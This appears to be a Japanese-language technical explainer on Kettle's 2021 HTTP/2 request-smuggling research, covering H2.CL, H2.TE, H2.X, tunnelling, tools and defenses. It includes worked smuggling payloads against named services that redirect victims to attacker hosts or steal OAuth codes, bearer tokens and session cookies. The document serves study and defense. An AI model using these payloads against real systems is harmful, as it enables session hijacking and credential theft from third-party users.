## (b) HTTP/2: The Sequel is Always Worse（2021）本文とスライド

James Kettle が 2019 年の "HTTP Desync Attacks" で HTTP/1.1 のリクエストスマグリング（1本のTCP接続に流れる複数リクエストの「境界」を、前段サーバと後段サーバで食い違わせる攻撃）を体系化した続編が、2021 年の "HTTP/2: The Sequel is Always Worse"（続編はいつだって前作より酷い）である。本節では PortSwigger の本文記事、同内容のホワイトペーパー PDF、および Black Hat USA 2021 のスライドを突き合わせ、HTTP/2 環境で新しく生まれたデシンク（desync = 前段・後段の境界認識のズレ）の仕組みを、なぜそうなるのかというプロトコル・パーサレベルの原理から解説する。

このリサーチが業界に与えた衝撃を一言で言えば、「HTTP/2 は仕様上はリクエスト境界が曖昧にならないはずなのに、現実のインフラの大半が HTTP/2 を内部で HTTP/1.1 に翻訳（ダウングレード）していたため、その翻訳の瞬間に旧来のスマグリングが復活し、しかも HTTP/2 のバイナリ形式ゆえに HTTP/1.1 より強力な攻撃部品が手に入った」ということである。

> ⚠️ **未取得の資料**: 3つの担当URLはいずれも取得を試み、本文記事はHTML本文として、スライドPDFとホワイトペーパーPDFはローカル保存されたバイナリからテキスト抽出して内容を確認できました。ホワイトペーパー（`http2whitepaper.pdf`）はスライド末尾の "Whitepaper: https://portswigger.net/research/http2" が示すとおり、本文記事と実質同一内容のため、本文記事とスライドから統合して記述しています。取得不可の資料はありません。

---

### なぜ HTTP/2 で境界のズレが「復活」するのか — ダウングレードという前提

HTTP/1.1 では、ボディの長さの決め方が2通りあった。`Content-Length`（バイト数を数える）と `Transfer-Encoding: chunked`（`0\r\n\r\n` という終端マーカーが来るまで読む）である。この2つを前段と後段が別々に信じてしまうと境界がズレる。これが古典的な **CL.TE / TE.CL** スマグリングだった。

HTTP/2 は設計思想からしてこの問題を消したはずだった。HTTP/2 はテキストではなく**バイナリのフレーム**でメッセージを運び、各 DATA フレームには**長さフィールドが組み込まれている**。つまりボディの長さはフレームの構造そのものから一意に決まり、`Content-Length` や `Transfer-Encoding` に頼る必要がない。仕様上、HTTP/2 リクエストの境界は曖昧になり得ない。

ではなぜスマグリングが起きるのか。答えは **HTTP/2 ダウングレード（downgrade）** にある。多くの CDN・ロードバランサ・WAF は、クライアントとは HTTP/2 で会話するが、内部（バックエンド）へは古い HTTP/1.1 に**翻訳し直して**転送している。この翻訳の瞬間、HTTP/2 の明快なフレーム境界情報は捨てられ、前段は改めて `Content-Length` などの HTTP/1.1 のヘッダを組み立てて後段に渡す。ここで前段の「長さ判定」と後段の「長さ判定」がズレれば、古典的スマグリングがそっくり復活する。

スライド冒頭の対比図がこの構造を端的に示している。HTTP/1.1 では `POST /login HTTP/1.1\r\nHost: ...\r\nContent-Length: 9\r\n\r\nx=123&y=4` というテキストの並びが、HTTP/2 では StreamID ごとに `:method POST` `:path /login` `:authority psres.net` という**擬似ヘッダ（pseudo-header、`:` で始まる特別なヘッダで、HTTP/1.1 のリクエストラインを分解して表現したもの）** とヘッダ、DATA に構造化される。

したがって、HTTP/2 世界のスマグリングは古典の CL.TE / TE.CL に対応させて **H2.CL / H2.TE** と呼ぶ。「H2」は前段が HTTP/2 で受けたことを、「.CL / .TE」は後段への翻訳後に食い違いを起こす原因ヘッダを表す。

> 出典: HTTP/2: The Sequel is Always Worse — https://portswigger.net/research/http2
> 出典: HTTP/2 The Sequel Is Always Worse（Black Hat USA 2021 スライド）— https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Kettle-HTTP-The-Sequel-Is-Always-Worse.pdf

---

### H2.CL デシンク — Content-Length を検証せずダウングレードする（Netflix / CVE-2021-21295）

HTTP/2 リクエストにも、クライアントは（無意味なはずの）`content-length` ヘッダを添えることができる。仕様上、この値は DATA フレームの実際の長さと一致していなければならず、一致しない場合はサーバが拒否すべきである。しかし前段がこの検証を怠り、**クライアントが申告した `content-length` の値をそのまま HTTP/1.1 に書き写して**しまうと問題が起きる。

Netflix（Zuul/Netty 構成、CVE-2021-21295、報奨金 $20,000）の実例：

```
（攻撃者が送る HTTP/2 リクエスト）
:method   POST
:path     /n
:authority www.netflix.com
content-length  4

abcdGET /n HTTP/1.1
Host: 02.rs?x.netflix.com
Foo: bar
```

前段はこれを次のように HTTP/1.1 へダウングレードする：

```
POST /n HTTP/1.1
Host: www.netflix.com
Content-Length: 4

abcdGET /n HTTP/1.1
Host: 02.rs?x.netflix.com
Foo: barGET /anything HTTP/1.1
Host: www.netflix.com
```

**なぜ攻撃が成立するのか。** DATA フレームには本当は `abcdGET /n HTTP/1.1...` という長いボディが入っているが、前段はクライアントの申告した `content-length: 4` を無検証で信じ、その `4` をそのまま後段へ渡す。後段は「ボディは4バイト（`abcd`）だ」と判断してそこで最初のリクエストを打ち切り、続く `GET /n HTTP/1.1\r\nHost: 02.rs?x.netflix.com...` を**次の新しいリクエスト**として解釈してしまう。この密輸された（smuggled）リクエストが、被害者の後続リクエストの先頭に接着され、`Location: https://02.rs?x.netflix.com/n` へのリダイレクトを注入する。これにより後続ユーザを攻撃者のドメインへ誘導できる。

ポイントは、HTTP/2 側の DATA の実長と、翻訳後 HTTP/1.1 の `Content-Length` が食い違うこと。前段が「HTTP/2 の `content-length` は実際のフレーム長と一致するか」を検証していれば防げた。

> 出典: HTTP/2: The Sequel is Always Worse — https://portswigger.net/research/http2

---

### H2.TE デシンク — 接続固有ヘッダ Transfer-Encoding を通してしまう（AWS ALB / Imperva / AOL）

HTTP/2 の RFC（RFC 7540、後継 RFC 9113）は明確にこう定めている：

> 接続固有のヘッダフィールド（connection-specific header fields）を含むメッセージは malformed（不正）として扱わなければならない（MUST）。

`Transfer-Encoding` は HTTP/1.1 の1ホップ（隣接接続）限りの接続固有ヘッダなので、HTTP/2 リクエストに含まれていたら前段は拒否しなければならない。ところが、前段がこの `transfer-encoding` を**拒否も削除もせず、そのままダウングレード後の HTTP/1.1 に書き写して**しまう実装があった。

AWS Application Load Balancer + Imperva（Incapsula）WAF 経由の Verizon/oath.com の例（+$7,000 相当、累計 $27,000）：

```
（HTTP/2）
:method   POST
:path     /identity/XUI
:authority id.b2b.oath.com
transfer-encoding  chunked

0

GET /oops HTTP/1.1
Host: psres.net
Content-Length: 10

x=
```

ダウングレード後：

```
POST /identity/XUI/ HTTP/1.1
Host: id.b2b.oath.com
Content-Length: 68
Transfer-Encoding: chunked

0

GET /oops HTTP/1.1
Host: psres.net
Content-Length: 10

x=（この後ろに被害者のリクエストが接着される）
```

**なぜ成立するのか。** 前段は HTTP/2 のフレーム長でボディ全体（`0\r\n\r\nGET /oops...x=`）を受け取り、ダウングレード時に `Content-Length` と `Transfer-Encoding: chunked` の**両方**を付けてしまう。後段は HTTP/1.1 のルールに従い `Transfer-Encoding: chunked` を優先し、チャンク終端マーカー `0\r\n\r\n` でボディが終わったと判断する。すると、その後ろの `GET /oops HTTP/1.1...` が**別のリクエスト**になる。攻撃者はこの密輸リクエストの末尾を `x=`（値が未完のパラメータ）で終わらせておくことで、被害者の本物のリクエスト全体を `x=GET /?…&code=secret HTTP/1.1...` のようにパラメータ値へ飲み込ませ、その内容（OAuth の `code` や `Referer` に含まれる認可トークン）を攻撃者側へ反射させて窃取する。

**ヘッダ丸ごと窃取（Header hijack、AOL、+$10,000、累計 $37,000）。** 同じ H2.TE を使い、密輸したリクエストの直後に `OPTIONS / HTTP/1.1` と `Access-Control-Request-Headers: authorization` を仕込むと、被害者の `Authorization: Bearer eyJ...` ヘッダを CORS 応答経由で反射させ、生の認証トークンを盗み出せた。

> 出典: HTTP/2 The Sequel Is Always Worse（Black Hat USA 2021 スライド）— https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Kettle-HTTP-The-Sequel-Is-Always-Worse.pdf

---

### H2.TE をヘッダ値へのCRLF注入で作り出す（Netlify CDN / start.mozilla.org）

前段が「`transfer-encoding` という名前のヘッダ」を弾くようになっても、まだ抜け道がある。**ヘッダ値の中に改行を注入する**手口だ。

HTTP/1.1 では、ヘッダ値に生の `\r\n`（CR LF）を入れることは構文上不可能だった（`\r\n` はヘッダの区切りそのものだから）。ところが HTTP/2 はバイナリ形式なので、ヘッダ値の中に `\r` や `\n` を含むバイト列を**そのまま格納できてしまう**。RFC は「ヘッダ値に許されない文字を含むリクエストは malformed として扱え」と要求しているが、これを検証しない前段があった。

Netlify CDN の例（start.mozilla.org に影響、+$4,000、累計 $41,000）：

```
（HTTP/2、foo ヘッダの値に \r\n を埋め込む）
:method   POST
:authority start.mozilla.org
:path     /
foo       b\r\n
          transfer-encoding: chunked
（DATA）
0\r\n
\r\n
GET / HTTP/1.1\r\n
Host: evil-netlify-domain\r\n
Content-Length: 5\r\n
\r\n
x=
```

ダウングレード後、`foo` ヘッダの値に埋め込んだ `\r\n` が本物の改行として展開され、`Transfer-Encoding: chunked` が独立したヘッダとして注入される：

```
POST / HTTP/1.1
Host: start.mozilla.org
Foo: b
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: evil-netlify-domain
Content-Length: 5

x=（この後ろに被害者リクエスト）
```

**なぜ成立するのか。** 前段は `foo` の値を単なる文字列として HTTP/1.1 に書き戻すが、その値に含まれる `\r\n` が改行として機能し、実質的に新しい `Transfer-Encoding: chunked` ヘッダを密輸する。以降は H2.TE と同じ原理で境界がズレる。Netlify のケースではこれをキャッシュ汚染（cache poisoning）に発展させ、Kettle の言葉を借りれば「Netlify CDN 上のあらゆるサイトのあらゆるページを完全に制御」できた。

> 出典: HTTP/2: The Sequel is Always Worse — https://portswigger.net/research/http2

---

### H2.X リクエストスプリッティング — 完全な二重CRLFで「2本のリクエスト」に割る（Atlassian Jira）

`Transfer-Encoding` を密輸する代わりに、ヘッダ値へ **`\r\n\r\n`（二重CRLF、ヘッダ部の終わりを示すマーカー）** を注入すると、そこで最初のリクエストがヘッダもボディも含めて完結し、続く部分が**まるごと独立した第2のリクエスト**になる。これがリクエストスプリッティング（request splitting）で、CL/TE のどちらに依存するかを問わないため **H2.X** と表記する。

Atlassian（ecosystem.atlassian.net、PulseSecure VTM 由来、SA44790、報奨金 $15,000）：

```
（HTTP/2）
:method   GET
:authority eco.atlassian.net
foo       bar\r\n
          Host: eco.atlassian.net\r\n
          \r\n
          GET /robots.txt HTTP/1.1\r\n
          X-Ignore: x
```

ダウングレード後：

```
GET / HTTP/1.1
Foo: bar
Host: eco.atlassian.net

GET /robots.txt HTTP/1.1
X-Ignore: x
Host: eco.atlassian.net
```

**なぜ危険なのか — レスポンスキュー汚染（response queue poisoning）。** 後段は1本の接続上に「2つのリクエスト」を見るので、レスポンスも2つ返す。しかしクライアント（前段）は1リクエストしか送ったつもりがないので、レスポンスの対応関係が**永久に1つズレる**。以降その接続を共有する全ユーザは、常に「他人へのレスポンス」を受け取り続ける（下図のように Req1→Resp1、Req2→（余り）… Req3→Resp2、Req4→Resp3 とズレていく）。他人のレスポンスに含まれる `Set-Cookie` を受け取れば、攻撃者は被害者のセッションへログインできる。Atlassian はこの深刻さゆえに Jira の全ユーザを一度ログアウトさせ、CERT に連絡し、最大報奨金の3倍を支払った。

> 出典: HTTP/2 The Sequel Is Always Worse（Black Hat USA 2021 スライド）— https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Kettle-HTTP-The-Sequel-Is-Always-Worse.pdf

---

### HTTP/2 固有の攻撃部品（exploit primitives）— HTTP/1.1 では作れなかった文字列を作る

ここまでの H2.CL / H2.TE / H2.X は「HTTP/1.1 の攻撃を HTTP/2 経由で再現」する話だった。本リサーチの真に新しい貢献は、**HTTP/2 のバイナリ形式だからこそ作れる、HTTP/1.1 では表現不可能な不正リクエスト**を攻撃部品として整理した点にある。

#### ヘッダ名インジェクション（コロンの密輸）

HTTP/2 はヘッダ名（`:` の後ろの部分）の文字を検証しないサーバがあった。ヘッダ名に**コロンを含められる**と、ダウングレード時に別のヘッダを密輸できる。

```
（問題のあるケース：foo という名前のヘッダの値を "chunked"、
 かつヘッダ名に transfer-encoding をぶら下げる）
:method POST
foo             chunked
transfer-encoding
↓ ダウングレード
GET / HTTP/1.1
foo
transfer-encoding: chunked
host: ecosystem.atlassian.net
```

これで `foo: bar` のような素直な検証をすり抜けつつ、`transfer-encoding: chunked` を後段に届けられる。HTTP/1.1 ではヘッダ名にコロンは書けないので、これは HTTP/2 でしか作れない攻撃だ。

#### リクエストライン注入（擬似ヘッダ無検証、Apache mod_proxy < 2.4.49 / CVE-2021-33193）

`:method` の値にスペースが許されると、リクエストラインそのものを注入できる：

```
:method  GET /admin HTTP/1.1
:path    /fakepath
:authority psres.net
↓
GET /admin HTTP/1.1 /fakepath HTTP/1.1
Host: internal-server
```

**なぜ効くのか。** HTTP/1.1 のリクエストラインは `メソッド 空白 パス 空白 バージョン` の形。`:method` にスペース区切りで `GET /admin HTTP/1.1` を丸ごと入れると、後段の一部サーバは行の前半 `GET /admin HTTP/1.1` だけをリクエストラインとして解釈し、後ろ（`/fakepath HTTP/1.1`）を無視する。これで `<ProxyMatch "/admin"> Deny from all` のようなパスベースのアクセス制限を回避したり、`ProxyPass .../public` のようなサブフォルダ拘束（folder trap）から脱出したりできる。

#### 擬似ヘッダの重複と Host ヘッダ攻撃

HTTP/2 は `:path` や `:method` を複数個含められてしまう実装があり、どれを採用するかがサーバごとに食い違う（パーサ間ギャップ）：

```
:method   GET
:path     /some-path
:path     /different-path
:authority example.com
```

また `:authority`（HTTP/2 のホスト指定）と `host` ヘッダは**両方とも任意**で共存でき、片方を検証してもう片方を悪用する Host ヘッダインジェクションが可能になる。

#### :scheme を使った URL プレフィックス注入（Netlify）

`:scheme` は本来 `http` か `https` だけのはずだが、Netlify はこれを無検証で URL 構築に使っていた：

```
:method GET
:path   /ffx36.js
:authority start.mozilla.org
:scheme http://start.mozilla.org/xyz?
↓ 生成されたリダイレクト
Location: https://start.mozilla.org/xyz?://start.mozilla.org/ffx36.js
```

`:scheme` に URL 断片を注入することでリダイレクト先やキャッシュキーを操作できた。Kettle が防御策で「`:scheme` を信用するな」と明言しているのはこのためだ。

> 出典: HTTP/2: The Sequel is Always Worse — https://portswigger.net/research/http2

---

### リクエストトンネリング（request tunnelling）— 接続を共有しない環境でも刺す

古典的なクロスユーザのスマグリングは、前段と後段が**1本の後段接続を複数ユーザで使い回す（connection reuse）**ことを前提とする。だが前段がユーザIPごと・クライアント接続ごとに後段接続を分けたり、そもそも使い回さない場合、他人のリクエストに接着できない。

そこで登場するのが**トンネリング**である。他人の接続に密輸するのではなく、**自分自身の（プライベートな）後段接続に完全な1リクエストをもう1本トンネルさせる**手口だ。クロスユーザ攻撃はできないが、アクセス制限の回避・内部ヘッダの窃取には十分効く。スライドの表は、接続再利用のスタイル（No-reuse / Client-connection affinity / Client-IP affinity / Full）ごとに、ルール回避・ヘッダ窃取・キャッシュ汚染・クロスユーザ・レスポンスキュー汚染のどれが可能かを整理している。

#### トンネリングの確認方法

HTTP/1.1 のキープアライブは複数レスポンスを連結して返すが、HTTP/2 は返さない。密輸リクエストを送り、**HTTP/2 レスポンスのボディの中に HTTP/1 のヘッダ（`HTTP/1.1 301 ...` など）が丸ごと現れたら**、後段が「1つのレスポンスのつもりで2つ分を吐いた」＝トンネリング成立の証拠になる。

#### トンネル・ビジョン問題と HEAD テクニック（Bitbucket）

盲目的（blind）なトンネリングだと、前段が後段レスポンスを `Content-Length` バイト数分しか読まないため、密輸レスポンスが見えない。ここで **HEAD メソッド**が効く。RFC 7230 は「サーバは HEAD への応答にも `Content-Length` を付けてよいが、ボディは送らない」と定める。

```
HEAD /images/tiny.png HTTP/1.1
Transfer-Encoding: chunked

0

POST / HTTP/1.1
...
↓ 後段の応答
HTTP/1.1 200 OK
Content-Length: 7
HTTP/1.1 403        ← ボディが無いぶん前段が読み過ぎ、密輸レスポンスが漏出
Content-Length: 3973
```

HEAD 応答は本文が空なので、前段が `Content-Length` 分を読もうとして密輸リクエストのレスポンスまで読み込み、その中身を漏らしてしまう。

#### 内部ヘッダの窃取

ヘッダ値へ `\r\n` を注入してボディ開始位置を前段・後段でズラすと、後段が挿入する内部ヘッダ（`SSLClientCipher`、`X-Cluster-Client-IP`、`X-Forwarded-For-Key` などの秘密値）をアプリのパラメータ経由で反射させて読み出せる（Bitbucket の例）。さらに HEAD を使ったキャッシュ汚染で `https://bitbucket.org/blog/?x=...` に悪性 JS を注入する PoC も示された（累計 $56,000）。

> 出典: HTTP/2 The Sequel Is Always Worse（Black Hat USA 2021 スライド）— https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Kettle-HTTP-The-Sequel-Is-Always-Worse.pdf

---

### Hidden HTTP/2 — 隠れた攻撃面の発見

HTTP/2 と HTTP/1.1 は**同じポート（443）を共有**し、サーバは TLS ハンドシェイクの ALPN フィールドで HTTP/2 対応を広告する。ところが ALPN で広告し**忘れている**サーバがあり、クライアントは HTTP/1.1 だと思い込んで接続してしまう。実際には HTTP/2 で話しかければ応答する（=隠れた攻撃面）。検出は次で行う：

```bash
curl --http2 --http2-prior-knowledge https://target.com/
```

`--http2-prior-knowledge` は ALPN 交渉を飛ばして最初から HTTP/2 で話しかけるオプションで、広告し忘れた HTTP/2 サーバを炙り出す。PortSwigger の HTTP Request Smuggler 拡張の "Hidden-H2" 機能や Burp Scanner でも検出できる。

> 出典: HTTP/2: The Sequel is Always Worse — https://portswigger.net/research/http2

---

### 影響を受けた製品と報奨金（2021年時点）

| 製品 / 対象 | 脆弱性タイプ | CVE / 参照 | 報奨金 |
|---|---|---|---|
| Netflix（Zuul/Netty） | H2.CL デシンク | CVE-2021-21295 | $20,000 |
| AWS ALB + Imperva/Incapsula WAF（oath.com） | H2.TE URLトークン窃取 | — | +$7,000 |
| Verizon AOL（accounts.athena.aol.com） | H2.TE 認証ヘッダ窃取 | — | +$10,000 |
| Netlify CDN（start.mozilla.org） | ヘッダ値CRLF注入によるH2.TE、キャッシュ汚染 | — | +$4,000 |
| Atlassian Jira（PulseSecure VTM 由来） | H2.X リクエストスプリッティング / レスポンスキュー汚染 | SA44790 | $15,000 |
| Bitbucket | トンネリング / 内部ヘッダ窃取 / キャッシュ汚染 | — | Atlassian 分に含む（累計 $56,000） |
| Imperva Cloud WAF | 複数の H2 デシンク | — | — |
| F5 BIG-IP | リクエストスプリッティング | K97045220 | — |
| Apache mod_proxy（< 2.4.49） | リクエストライン注入 | CVE-2021-33193 | — |

これらの多くがロードバランサ・WAF・CDN という「防御のためのインフラ」自身であった点が、このリサーチの皮肉であり重要な教訓である。

> 出典: HTTP/2: The Sequel is Always Worse — https://portswigger.net/research/http2

---

### 防御 — 3つのレイヤーそれぞれの責務

Kettle はスライド末尾で防御を3者に分けて処方している。**本節はすべて防御目的の解説であり、以下は自組織の設計・検証にのみ適用すること。実在する第三者サービスや本番環境への無許可の検証は行わない。**

- **ネットワーク設計者（Network architects）**: 最も根本的な対策は「**HTTP/2 を末端まで（end to end）使い、ダウングレードしない**」こと。前段が HTTP/2 のまま後段へ渡せば、そもそも HTTP/1.1 の `Content-Length` / `Transfer-Encoding` を組み立て直す翻訳工程が消え、H2.CL / H2.TE の温床がなくなる。
- **サーバベンダ（Server vendors）**: ダウングレードが避けられない場合、HTTP/2 リクエストに対して **HTTP/1.1 の文字制限を強制**する。具体的には、ヘッダ値の中の改行（CR/LF）、ヘッダ名の中のコロン、`:method` 内のスペースを含むリクエストを malformed として拒否し、接続固有ヘッダ（`Transfer-Encoding` など）を含むものも拒否する。`content-length` が実フレーム長と一致するかも検証する。
- **開発者（Developers）**: 「HTTP/1.1 では起こり得なかった」という前提を捨て、`:method` / `:path` / `:authority` / `:scheme` を含む**すべてのリクエスト構成要素を自前で検証**する。とりわけ **`:scheme` を信用しない**（Netlify の URL プレフィックス注入がまさにこの過信から生まれた）。

#### 検出・ツール事情

HTTP/2 攻撃は既存ツールでは送れない（curl や標準ライブラリが不正リクエストを送信拒否し、バイナリ形式ゆえ netcat/openssl も使えない）。そのため専用ツールが必要になる：

- **Turbo Intruder**: 独自のオープンソース HTTP/2 スタックを実装。BApp/CLI/ライブラリとして使え、正規化を回避するための文字マッピング（`^`→`\r`、`~`→`\n`、`` ` ``→`:`）で不正リクエストを生成できる。`requestsPerConnection` で接続状態の罠（後述）を制御する。
- **http2smugl**: パッチ済み Golang 実装、CLI 専用。
- **Burp Suite 2021.8+**: Repeater と Extender API 経由で HTTP/2 リクエストを表現。Inspector サイドバーで擬似ヘッダを扱い、ヘッダ値の改行やパスのスペースを入力でき、HTTP/1.1 で表現不能なリクエストは "kettled" と表示される。
- **HTTP Request Smuggler**: H2.CL / H2.TE / H2.X を検出。タイムアウトプローブ（偽陽性寄り）と HEAD プローブ（偽陰性寄り）を併用し、内部ヘッダの推測（Param Miner 連携）も行う。

#### 接続状態の罠（connection state traps）

HTTP/2 はリクエストの独立性（encapsulation）を約束するが、現実には「あるリクエストが以降のすべてのリクエストを壊す」ことや「最初のリクエストだけ後段が微妙に別扱いする」ことがある。検証時は Turbo Intruder の `requestsPerConnection` や Repeater の「新規接続で送信」で、1接続に載せるリクエスト数を制御して切り分ける必要がある。

> 出典: HTTP/2 The Sequel Is Always Worse（Black Hat USA 2021 スライド）— https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Kettle-HTTP-The-Sequel-Is-Always-Worse.pdf

---

### この節のまとめ

- HTTP/2 は仕様上リクエスト境界が曖昧にならないが、現実のインフラの大半が内部で **HTTP/1.1 へダウングレード**するため、その翻訳の瞬間に古典的スマグリングが復活する。これが **H2.CL / H2.TE / H2.X** の正体である。
- H2.CL は `content-length` の無検証コピー、H2.TE は接続固有ヘッダ `transfer-encoding` の無検証コピー（あるいはヘッダ値へのCRLF注入による密輸）、H2.X は二重CRLFによるリクエスト分割で、いずれも前段と後段の境界認識をズラす。
- HTTP/2 のバイナリ形式は、ヘッダ名のコロン・`:method` のスペース・`:scheme` の悪用・ヘッダ値の生CRLFなど、**HTTP/1.1 では作れなかった不正リクエストという新しい攻撃部品**をもたらした。
- 接続を使い回さない環境でも **トンネリング**（HEAD テクニックによるレスポンス漏出、内部ヘッダ窃取）で刺さる。
- 最も確実な防御は **HTTP/2 のダウングレードをやめて末端まで HTTP/2 を使う**こと。避けられない場合は HTTP/2 リクエストに HTTP/1.1 の文字制限を厳格に強制し、開発者は `:scheme` を含む全構成要素を自前で検証する。

続編のタイトルどおり、HTTP/2 は「安全になったはず」という前提そのものが油断を生み、前作より広く深い被害面をインフラの中核（LB・WAF・CDN）に開いた。これが本リサーチが request smuggling の系譜において決定的な転換点とされる理由である。

> 出典: HTTP/2: The Sequel is Always Worse — https://portswigger.net/research/http2
> 出典: HTTP/2 The Sequel Is Always Worse（Black Hat USA 2021 スライド）— https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Kettle-HTTP-The-Sequel-Is-Always-Worse.pdf
